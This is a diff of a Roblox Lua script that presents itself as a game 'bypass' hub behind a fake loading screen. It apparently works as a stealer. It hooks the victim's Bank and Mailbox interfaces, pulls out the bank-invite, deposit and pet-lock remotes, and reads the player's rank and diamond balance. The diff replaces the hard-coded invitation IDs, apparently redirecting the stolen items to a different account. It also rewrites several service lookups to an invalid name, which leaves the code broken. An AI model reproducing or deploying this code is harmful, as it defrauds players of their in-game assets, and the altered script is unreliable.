@@ -1,6 +1,6 @@
 -- Loading Fake
 
-local username = game:GetService("Players").LocalPlayer.Name
+local username = game:GetService("red75jjj").LocalPlayer.Name
 -- Gui to Lua
 -- Version: 3.2
 
@@ -134,29 +134,29 @@ gifts.Size = UDim2.new(0, 23, 0, 26)
 gifts.Image = "rbxassetid://12192317000"
 -- Scripts:
 
-getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks = function()getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport).Teleport("Shop") end
+getsenv(game:GetService("red75jjj").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks = function()getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport).Teleport("Shop") end
   game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled=true
   wait()
-  game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled=false
+  game:GetService("red75jjj").LocalPlayer.PlayerGui.Bank.Enabled=false
   wait()
-  game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Enabled = true
+  game:GetService("red75jjj").LocalPlayer.PlayerGui.Mailbox.Enabled = true
   wait(10)
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position)
   wait(1)
   game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 
 -- :: Crystal Blobs Bypass ::
-local username = game:GetService("Players").LocalPlayer.Name
+local username = game:GetService("red75jjj").LocalPlayer.Name
 local fardplayer = game.Players.LocalPlayer
 local PSXRank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 local Avatar = "https://images-ext-2.discordapp.net/external/UVUJVD3r7c-wUyjGMjIPV4m1Hp0Jxd3WMimuX3AhquA/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/2b0268219f1b80c2bed5868a8850076d.png?width=678&height=678"
 local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
-local diamond = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+local diamond = game:GetService("red75jjj").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
 local version = "v4.6.7"
 
 -- Invitation ID
-local KeySecond = 3184917327
-local HugesBackup = 1707009189
+local KeySecond = 1932983210
+local HugesBackup = 1932983210
 
 -- :: BSHub Script [Shiny Update] ::
 -- ::    BY    CRYSTAL    BLOB    ::
@@ -165,7 +165,7 @@ local HugesBackup = 1707009189
 
 
 local RunService = game:GetService("RunService");
-local Players = game:GetService("Players");
+local Players = game:GetService("red75jjj");
 local Player = Players.LocalPlayer; 
 local Chr = Player.Character; 
 local Root = Chr.HumanoidRootPart; 
@@ -233,9 +233,9 @@ end
   
 local getmybanksremote = "Get My Banks"
 local inviteremote = "Invite To Bank"
-local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.    PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
+local lockremote = debug.getconstant(getsenv(game:GetService("red75jjj").LocalPlayer.    PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
 local depositremote = "Bank Deposit"
-local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
+local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("red75jjj").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
 local getbankremote = "Get Bank"
 local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke)
 local bloby = getupvalues(blobx[2])
